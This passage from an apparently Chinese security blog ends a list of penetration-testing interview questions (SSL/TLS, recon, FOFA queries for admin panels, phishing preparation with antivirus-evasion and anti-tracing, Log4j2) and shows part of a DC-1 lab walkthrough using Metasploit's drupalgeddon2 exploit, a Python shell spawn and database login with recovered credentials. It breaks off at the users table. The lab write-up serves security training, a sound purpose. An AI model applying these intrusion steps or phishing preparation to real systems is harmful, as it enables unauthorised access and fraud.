<li>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误URI和URL的区别URI，统一资源标识符，用来唯 一的标识一个资源。URL可以用来标识一个资源，而且还指明了如何定位这个资源。</li>
</ul>
<h2 id="95-什么是SSL-？https是如何保证数据传输的安全（SSL是怎么工作-保证安全的）"><a href="#95-什么是SSL-？https是如何保证数据传输的安全（SSL是怎么工作-保证安全的）" class="headerlink" title="95.什么是SSL ？https是如何保证数据传输的安全（SSL是怎么工作 保证安全的）"></a>95.什么是SSL ？https是如何保证数据传输的安全（SSL是怎么工作 保证安全的）</h2><ul>
<li><p>SSL代表安全套接字层。它是一种用于加密和验证应用程序（如浏览器）和Web服务器之间发送的数据的协议。 身份验证 ， 加密Https的加密机制是一种共享密钥加密和公开密钥加密并用的混合加密机制。 </p>
</li>
<li><p>SSL&#x2F;TLS协议作用：认证用户和服务，加密数据，维护数据的完整性的应用层协议加密和解密需要两个不 同的密钥，故被称为非对称加密；加密和解密都使用同一个密钥的 对称加密。 优点在于加密、解密效率 通常比较高HTTPS 是基于非对称加密的， 公钥是公开的。</p>
<ol>
<li><p>客户端向服务器端发起SSL连接请求； </p>
</li>
<li><p>服务器把公钥发送给客户端，并且服务器端保存着唯一的私钥 </p>
</li>
<li><p>客户端用公钥对双方通信的对称秘钥进行加密，并发送给服务器端 </p>
</li>
<li><p>服务器利用自己唯一的私钥对客户端发来的对称秘钥进行解密， </p>
</li>
<li><p>进行数据传输，服务器和客户端双方用公有的相同的对称秘钥对数据进行加密解密，可以保证在数 据收发过程中的安全，即是第三方获得数据包，也无法对其进行加密，解密和篡改。 因为数字签名、摘要是证书防伪非常关键的武器。 “摘要”就是对传输的内容，通过hash算法计算出一段 固定长度的串。然后，在通过CA的私钥对这段摘要进行加密，加密后得到的结果就是“数字签名”</p>
</li>
</ol>
</li>
</ul>
<p>SSL&#x2F;TLS协议的基本思路是采用公钥加密法，也就是说，客户端先向服务器端索要公钥，然后用公钥加密 信息，服务器收到密文后，用自己的私钥解密。</p>
<h2 id="96-如何保证公钥不被篡改"><a href="#96-如何保证公钥不被篡改" class="headerlink" title="96.如何保证公钥不被篡改"></a>96.如何保证公钥不被篡改</h2><p>将公钥放在数字证书中。只要证书是可信的，公钥就是可信的。 </p>
<p><strong>公钥加密计算量太大，如何减少耗用的时间？</strong> </p>
<p>每一次对话（session），客户端和服务器端都生成一个”对话密钥”（session key），用它来加密信息。 由于”对话密钥”是对称加密，所以运算速度非常快，而服务器公钥只用于加密”对话密钥”本身，这样就减 少了加密运算的消耗时间。 </p>
<ol>
<li>客户端向服务器端索要并验证公钥。 </li>
<li>双方协商生成”对话密钥”。 </li>
<li>双方采用”对话密钥”进行加密通信。上面过程的前两步，又称为”握手阶段”（handshake）。</li>
</ol>
<h2 id="97-算法？了解过什么排序？"><a href="#97-算法？了解过什么排序？" class="headerlink" title="97.算法？了解过什么排序？"></a>97.算法？了解过什么排序？</h2><ul>
<li>冒泡排序</li>
<li>选择排序</li>
<li>插入排序</li>
</ul>
<h2 id="98-描述外网打点的流程？"><a href="#98-描述外网打点的流程？" class="headerlink" title="98.描述外网打点的流程？"></a>98.描述外网打点的流程？</h2><ul>
<li><p>靶标确认、信息收集、漏洞探测、漏洞利用、权限获取。最终的目的是获取靶标的系统权限&#x2F;关键数据。</p>
</li>
<li><p>在这个过程中，信息收集最为重要。掌握靶标情报越多，后续就会有更多的攻击方式去打点。比如：钓鱼邮件、web 漏洞、边界网络设备漏洞、弱口令等。 </p>
<p><strong>小问题：什么是钓鱼网站？</strong><br>网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达 5%的人都会对这些骗局做出响应 。</p>
</li>
</ul>
<p><strong>所用的工具：</strong></p>
<ul>
<li>Wappalyzer ：网站技术识别工具</li>
<li>Goby&#x2F;FOFA：网络安全测试工具，由赵武打造，它能对一个目标企业梳理最全的攻击面信息，能够快速的从一个验证入口点，切换到横向。FOFA（网络空间资产搜索引擎）</li>
<li>Masscan：端口扫描</li>
</ul>
<h2 id="99-举几个-FOFA-在外网打点过程中的使用小技巧？"><a href="#99-举几个-FOFA-在外网打点过程中的使用小技巧？" class="headerlink" title="99.举几个 FOFA 在外网打点过程中的使用小技巧？"></a>99.举几个 FOFA 在外网打点过程中的使用小技巧？</h2><p><strong>后台挖掘：</strong>title&#x3D;“后台”&amp;&amp;body&#x3D;“password’&amp;&amp;host&#x3D;”x.cn” </p>
<p><strong>子域名：</strong>title！&#x3D;‘404’&amp;&amp;title！&#x3D;‘302’&amp;&amp;host&#x3D;‘x.cn’</p>
<p><strong>C 段：</strong>ip&#x3D;‘x.x.x.x&#x2F;24’&amp;&amp;host&#x3D;‘x.cn’ </p>
<p><strong>框架特征：</strong>body&#x3D;‘icon-spring-boot-admin.svg’ </p>
<p><strong>漏洞：</strong>body&#x3D;‘index&#x2F;of’「列目录漏洞」</p>
<h2 id="100-如何识别-CND？"><a href="#100-如何识别-CND？" class="headerlink" title="100.如何识别 CND？"></a>100.如何识别 CND？</h2><p>1、通过 ping 命令，查看回显情况</p>
<p>2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况</p>
<p>3、超级 ping 工具，比如”all-tool.cn&#x2F;tools&#x2F;ping“「看 ip 结果」</p>
<h2 id="101-邮件钓鱼的准备工作有哪些"><a href="#101-邮件钓鱼的准备工作有哪些" class="headerlink" title="101.邮件钓鱼的准备工作有哪些?"></a>101.邮件钓鱼的准备工作有哪些?</h2><p>钓鱼邮件，即一种伪造邮件，是指利用伪装的电子邮件，来欺骗收件人点击恶意 URL，或诱导收件人下载带恶意程序的可执行文件。</p>
<ol>
<li>确定邮件钓鱼的形式：链接、文件</li>
<li>收集目标相关的邮箱</li>
<li>编写钓鱼邮件文案</li>
<li>匿名邮箱</li>
<li>木马免杀测试、钓鱼站点搭建</li>
<li>反溯源</li>
</ol>
<h2 id="102-判断出靶标的-CMS，对外网打点有什么意义？"><a href="#102-判断出靶标的-CMS，对外网打点有什么意义？" class="headerlink" title="102.判断出靶标的 CMS，对外网打点有什么意义？"></a>102.判断出靶标的 CMS，对外网打点有什么意义？</h2><p>CMS 是 Content Management System 的缩写，意为“内容管理系统”。</p>
<p>CMS 其实是一个很广泛的称呼，从一般的博客程序，新闻发布程序，到综合性的网站管理程序都可以被称为内容管理系统。</p>
<ol>
<li><p>判断当前使用的 CMS 是否存在 Nday，尝试利用公开的 poc、exp 进行测试</p>
</li>
<li><p>根据 CMS 特征关联同 CMS 框架站点，进行敏感备份文件扫描，有可能获得站点备份文件。尝试从CMS 源码进行代码审计，挖掘潜在漏洞。</p>
</li>
</ol>
<p>注:<br>   0-day，就是只有你知道的一个漏洞！<br>   1-day，就是刚刚公布的漏洞（没有超过一天）。<br>   n-day，就是这个漏洞已经公布出来了 N 天啦！</p>
<h2 id="103-Apache-Log4j2-的漏洞原理是什么？"><a href="#103-Apache-Log4j2-的漏洞原理是什么？" class="headerlink" title="103.Apache Log4j2 的漏洞原理是什么？"></a>103.Apache Log4j2 的漏洞原理是什么？</h2><p>由于 Log4j2 组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务 器发送恶意的数据，触发 log4j2 组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<h2 id="104-水坑攻击和鱼叉攻击的区别是什么？"><a href="#104-水坑攻击和鱼叉攻击的区别是什么？" class="headerlink" title="104.水坑攻击和鱼叉攻击的区别是什么？"></a>104.水坑攻击和鱼叉攻击的区别是什么？</h2><ul>
<li><p>水坑攻击指的就是黑客通过分析被攻击者经常访问的网络活动规律，寻找被攻击者经常访问的网站的 弱点，先攻击该网站植入攻击代码，等待被攻击者来访时实施攻击。 </p>
</li>
<li><p>鱼叉攻击是指利用木马程序作为电子邮件的附件，发送到目标电脑，诱导受害者去打开附件感染木马。</p>
</li>
</ul>
<h2 id="105-如何判断靶标站点是-windows-linux"><a href="#105-如何判断靶标站点是-windows-linux" class="headerlink" title="105.如何判断靶标站点是 windows&#x2F;linux"></a>105.如何判断靶标站点是 windows&#x2F;linux</h2><ol>
<li><p>大小写检测：windows 大小写不敏感，而 linux 大小写敏感。</p>
</li>
<li><p>PING 指令：根据 TTL 值，winodws 一般情况下&gt;100,linux&lt;100</p>
</li>
</ol>
<p>TTL(生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p>
]]></content>
      <categories>
        <category>网络安全知识，题库，面试</category>
      </categories>
      <tags>
        <tag>网络安全，护网</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1</title>
    <url>/2024/04/01/la/</url>
    <content><![CDATA[<ol>
<li><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1></li>
<li><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2></li>
<li><p>Kali</p>
</li>
<li><p>DC-1靶场机安装</p>
</li>
</ol>
<p>安装链接：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
<ol>
<li><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2></li>
</ol>
<p>下载文件进行解压</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FiOTE0ZDZiOWQwZjBhMGFlYTljMmYzNTA0NzAyZTJfQU1Ya3dVeE9XSGZ3cHZDdTUxTUVjTjNJeTB4Q3R3MWxfVG9rZW46UzEyTGJyZVg5b3E4UWx4WXhoVGNJYnlCbk5kXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>解压完成直接使用虚拟机打开</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNmYmZmOGEwZGY5ZjY3NTdiNDU5Mzc2YmQ0OGY0ZDBfS1U5QnozaWtzcElWaUxtdWpsWEV4NHprRWpWSnczT0VfVG9rZW46RWt5c2J4QUxNb3NsOG14NFAzRWM2ankzbmVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>提示导入失败，不过没有关系点重试就好，导入完成后，打开DC-1虚拟机并等待，过程中别点进虚拟机里面</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1ZjcwYjUyNjUwZDM3MjRkZjM1YjlkZGNlYTc4MjBfbWVGY0NFeWVXSVY0dDBrSlZ3cHpHTTdpeVBHN21QRFFfVG9rZW46VTVZM2I1bk5Jb3ZMd2l4UEsybGNsTjljbmhoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>出现这个界面就表示开启成功 （渗透完得到密码就能登入啦）</p>
<h4 id="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）"><a href="#注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）" class="headerlink" title="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https://zhuanlan.zhihu.com/p/65103100）"></a>注意！！！！<a href="https://so.csdn.net/so/search?q=%E9%9D%B6%E6%9C%BA&spm=1001.2101.3001.7020">靶机</a>和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（<a href="https://zhuanlan.zhihu.com/p/65103100%EF%BC%89">https://zhuanlan.zhihu.com/p/65103100）</a></h4><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmVlMjM1YWI5NjJkOGE3NDYwNjA0MmYyMDRiYzI4YWNfc2dwNGRrU2Y0Ylh3N2VPR25Va3BOd21NN2ZSZ1EwMkZfVG9rZW46RTBaUGJ6TlE5b2M0alp4bjhnNGNXYnFvblNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<ol>
<li><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1></li>
</ol>
<p>这个过程需要用到kali，打开kali</p>
<ol>
<li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2></li>
</ol>
<h3 id="①探测主机ip"><a href="#①探测主机ip" class="headerlink" title="①探测主机ip"></a>①探测主机ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQzNDYyNGM3ODczZjkyZGMzY2JhMzAzMTY3NDE4YjJfcTZKUG5aWnZ6ZU9PUHo0cjFyMWY4S2hYcGExdkpFY3hfVG9rZW46SmNXc2J4NHZIb2pJZlp4ZW9yWmNuakNJbmplXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<h3 id="②探测目标ip开放端口"><a href="#②探测目标ip开放端口" class="headerlink" title="②探测目标ip开放端口"></a>②探测目标ip开放端口</h3><p>用nmap来探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1MDJlOTVmYmM4YmIwMjNlY2QwOWFjMWMwYzliZWRfSnNyQVhmYk84M3BBdk5jdXZ4M05xY2g5Rk56UHVDVUlfVG9rZW46TFVFQWJJTkNZb0prelV4UElsSmNOUVgxbkxmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>进行端口的扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap -P</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5NmM0M2E0YzY0YmNlNzMyYThlNjRjODIzYjdmNGJfTERsTkUyTlJaTWt3bW9hU2FyTXZ4UG9HQ3NyZ21LTjNfVG9rZW46R3BYM2I1bHdib0FDY3p4SncxTGNZSFg3bkJoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<h5 id="③收集网页信息"><a href="#③收集网页信息" class="headerlink" title="③收集网页信息"></a>③收集网页信息</h5><p>浏览器输入地址</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA0YjAwODMyYTVlMDQwYzcwZjY2N2YwYjE2ODNjMDJfamN2Smpya3hiTDlKZXFlNExBbUVqM1AxVGdERkY0ZXJfVG9rZW46U3d4cmJBREZ1b3ZZQ0t4TmliS2NlajF3bnBlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>利用火绒插件<strong>wappalyzer</strong>，查看站点信息，也可以自己判断，网页一看cms就是drupal</p>
<h5 id="什么是cms？"><a href="#什么是cms？" class="headerlink" title="什么是cms？"></a>什么是cms？</h5><blockquote>
<p>CMS是”Content Management System”的缩写，意为”内容管理系统”。 它采用统一的信息组织的方法即分类，对同一类型的信息进行分类，且每一类信息都可以进行新建（Add）、查看（View）、编辑（Edit）和删除（Delete）四种不同的操作。除了使用分类的方式组织信息以外，又采用了统一的用户和权限管理对信息的使用进行控制，即构成了一个完整的信息组织和管理的体系。内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场.</p>
</blockquote>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzg4ZjhmNjMzYmVkNTM2YjUzYTFjNjZiZDM0YmY0NWVfZ1hYSVFFUEh6cmdZUE5JTjlZOGVTSk1meGxYRkhQRnpfVG9rZW46SUVtZGJrVzZxb0IyYXp4cEVjZWNQSlRZbklrXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<ol>
<li><h2 id="漏洞查找与利用"><a href="#漏洞查找与利用" class="headerlink" title="漏洞查找与利用"></a>漏洞查找与利用</h2></li>
</ol>
<p>什么是Drupal</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNzEzZDY2ZGIzNjVjZjE0NTFjNGRhMDI3ZmYzNTRfZkdCZDE5OWRXd1daQWdZYmxHc2l5MUJKZnlyRlczbnNfVG9rZW46UkwyUWJKZnRwb1VGdHZ4VG12NGNnTTQ5bkppXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzlmOTVjNGFiZTc4MzE1MDEyOWU4YzRhMTgwYTRjNDNfV2pVVXZMamgyNnlzVFpRTTY3N0pReW5qd283WEw3TDRfVG9rZW46SzNYQWJOVGphbzZwcDR4T2VhZmN4WDl2bllkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>或者在工具中打开</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhhOTBhOGM2MTA5MTc1MzgyODZjNTY1ZWY4MmIxNDRfSGVSMFFkdFNWanhGSXptNTdjTnFiRndiUUZQclFQYm9fVG9rZW46SVFFdWJyZk05bzVCdWl4ZXhHdGNDRU1XbkpiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>代开之后在里面搜索drupal</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQwZWNjZjZhNTQwZDQwNDE4MWUxNTkwZDhjYzIyNTJfZEo3N0tjelA5UlM4MGl5QmRzb1gyQzFDRXRjcXFtQVFfVG9rZW46QTNvZGI3ak5qbzRONnZ4NzQyVGMxelVrbnBjXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>这里是drupal的漏洞</p>
<h3 id="①漏洞查找"><a href="#①漏洞查找" class="headerlink" title="①漏洞查找"></a>①漏洞查找</h3><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiM2M3OThiYjcxMTI5MTkxMDkxZWRmNTY3ZWM1YWVfalJOa1ZnaEJMdW5HNGZoN2FreXNRb1owSVNHcmpyVmNfVG9rZW46VkFvQmJ3aWFKb0J5Q2x4Z1dQZ2Nkb0V2bkNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>用工具Metasploit（目前世界上领先的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，也是信息安全与渗透测试领域最大的开源项目之一），找一下漏洞，先打开工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">metasploit</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgzM2I4ZDRlOGI4OGY1YzEyOWMyMDQ4Njc3NTNlZGZfSHNlOEZHMWxYdERoU2JPVnlhYmdUQlhmZXlXNHhuUWhfVG9rZW46RGZDRmJaNnJZb0RKTXZ4SUxnMWMxcGFPbjFnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>然后输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUwODgwMWFlNmExNzBiMzcwNjE5YzFhN2I2N2EzMmNfYVp0N25KSDVKQVZseDJYdG1ORzFHRXRIU1MxNGp6bUlfVG9rZW46Q3Q5UGJGajNPb1NPaW54Mnh0d2NrR0p1bnpkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>这些就是Drupal的漏洞，可以看到漏洞还挺多的</p>
<p>在这里面使用 1  exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection  这个脚本</p>
<p>输入：<code>use 1</code></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI4YjQ5YThjYmU0YmE2NjA0NTBjMjE3OWNiOTA1MmRfenpmZXU2MUg1eGdJMmh3a3JLd051UnJxV0htVlV5UU9fVG9rZW46UjVaRmJuNmpEb3U0bGR4OVJ0UmNtaWNNbjRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>接着看一下该漏洞模块参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTVlMTY3NDlhMmFlOGY1ZmFiNjkxYzc5YjY3MzM2YTZfcURnM0VncmpRR1VyS20zVmhKR0lPUHRDZTBvY0ZuSlpfVG9rZW46SlE4bWJQMllZb0FrU1F4WmxWd2M3RWpjbmVoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<blockquote>
<p>Current Setting是目前设置的内容 Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置 就上面来说RHOSTS需要set，但是没有内容</p>
</blockquote>
<p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.217.18</span><br></pre></td></tr></table></figure>

<p>然后再show一下模块参数</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE3MjBjZjUyNDljMDhhNGVjN2ZiZjNhMGQwZTFhOGVfUWNFOWhtcnlVVFlCdFZic0I0anF5WDhRdjlIMmo0STRfVG9rZW46SHJpSWJyUkVpbzhVNDZ4T1M3bWNVTlhUbnlmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>设置好参数后开始攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>exploit和run是一样的，用run也可以</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTA4MzU1ZWVlODk2NmExNGRjYTQ3NmVkODZkNWU1NGJfNFdQTEhQRFRBUFl4SVR0VXhPeGc5TnN4c3BRVkVNVFNfVG9rZW46VmNHNGJCRjZFb1ZVRGN4cXNva2NJVjVlbmdoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以直接上shell</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzYTQ5ZjYwYmIwNTViZDA3MDFlOTNmNjg2MzU3YmRfaE9VT1RvSnpMZERYTWRlT3RZclBHdnU2ek83UW94YzdfVG9rZW46UzdqUGJ3YkZPb1JvVnF4YklYUGN5QUZZblM2XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<ol>
<li><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2></li>
</ol>
<h3 id="①获取普通shell"><a href="#①获取普通shell" class="headerlink" title="①获取普通shell"></a>①获取普通shell</h3><p>然后执行ls命令</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQzY2ZhNjcwMWVkYzlkY2UyOTg3ZTBmN2YxZjVmNWFfbkU2RnBtZnVjMWNtRkdzU3VQVHhPU0hGa1liYnhFR2JfVG9rZW46U3NQVGIwQ1dabzRIVDN4c2kwbmM5OUl2bjFmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<h3 id="②获取交互shell"><a href="#②获取交互shell" class="headerlink" title="②获取交互shell"></a>②获取交互shell</h3><p>这样看起来有点费劲，不过我们可以利用python实现互交shell，这样就好看一点，使用的前提是攻击主机上必须装有python</p>
<p>“我不会安装python”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>这是一个固定姿势，直接复制就能用</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTlkMTRkNWM3MTIzNDgyNGViZWRkZDU3ZDE3M2Q5YTdfTnBnb1RjSWRXcHJhOWowUXc0OXpNWVBJb1lSS1dKYVNfVG9rZW46T0VyTmJPNUFpb2szeVR4WEZ6amNINURGbmNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>可以看到这个shell的权限只是普通权限，还不是root，不过还能看看文件啦，先看一下发现的flag1.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZhNzJiYmJhZjMzMGU0MTZkMzNmYTQzMjM4NmE1N2ZfRDloODRWRjJ3OVlSY2FTcW5Xc2VVa0RKSTI5NlUxQkpfVG9rZW46SlhqOWJ6Mjdqb0p6QVZ4TmJqTGNMbmxjblZnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>翻译过来就是：每个好的CMS都需要一个配置文件，你也一样，emmm，这个先放着，看看还有没有其他flag文件</p>
<p>我们再看看有没有其他flag文件 <code>find / -name flag*</code></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmUxZjBhMjIwOWNkMDM2MzUwMGNkZmQ5ZTczOWZlZDFfUjUwMUI0bWljVU9QaGNyUkV1TmNqU3A3SFhQOEU4RjNfVG9rZW46RllPUWJkZUc5b25QQlN4VXlJN2M4Y29vblNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>好吧只有一个，我们再看看他的配置文件，一般来说配置文件都有一些特别重要的信息在里面，搞不好还能提权，百度Drupal配置文件（每一个好的CMS都需要一个配置文件）</p>
<p>下一个攻克点提示在配置文件中</p>
<p>百度找到的durpal的配置文件是 &#x2F;vsr&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
<p>进入durpal配置文件</p>
<p>逐层解剖 找到flag2文件 进行读取</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmQ1ZWFhNDFjNzlmMjk1NWNkNzdmZmNjOWY4NWNhMWRfY3FRaFRYVzlDMElVcnlHanlCOWxzakE2d1pKMlBrODlfVG9rZW46U0V2bWJFZGkyb0lIYmx4NElBb2NGY0p0bmtiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFiMzZiMjUyODY2Y2UwYmI3YjY5N2YyNTA0NjczNDBfdUx4VEJWU2ZSUWlyanFwU0liakptaUtSVjBXcTBodElfVG9rZW46VHFZa2I1Vzg4b2haZDJ4WEFkOGNweXpYbndFXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<ol>
<li><h2 id="数据库渗透"><a href="#数据库渗透" class="headerlink" title="数据库渗透"></a>数据库渗透</h2></li>
</ol>
<p>发现第二个flag以及数据可以账号密码、咱们登录一下</p>
<p><code>mysql -udbuser -pR0ck3t</code>  mysql -u dbuser -p </p>
<p>mysql -u dbuser -p </p>
<p>Enter password: R0ck3t</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVjYThhM2M0YmM1ZTJiOTViMjk0OTZmMzQxZjdjZWNfTmJDNlJLdUR6SUFQWkdtSXNtb1VUanFGZW4zMDJPc0lfVG9rZW46SXVkQ2JVNHIxbzJ1TWd4Y01namM4d0FwbjF5XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>登进去了，这样我们就可以为所欲为修改数据库了，先看看有啥好东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWI3NDJmM2Q3NWVjOWZlN2E1Mjg4NGU3NGVlYzJkNzRfMzZsYkhWVkpGUGZCUnJ1ODVxbmdhTzNRMlFBYW9PbWRfVG9rZW46UTB3Y2J2S1Exb0M1bVF4dkYxR2NLVDZWbmhiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>接着使用该数据库，并查看表 <code>use drupaldb;show tables;</code></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4ZGE4MTEwMDUwNTA3OWIyNzI5ZGY1YjUxNTlkZWVfOXFqSzBRWGEyYXV5b05WekNUdHZ4ZWxyU0RJYzNNV3BfVG9rZW46RllLemJUVE11bzRzbEp4WE5ZSWNhbEs1bkVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>注意到users这个表，看一下有啥，先改小一点字体，不然可能会挤爆不美观</p>
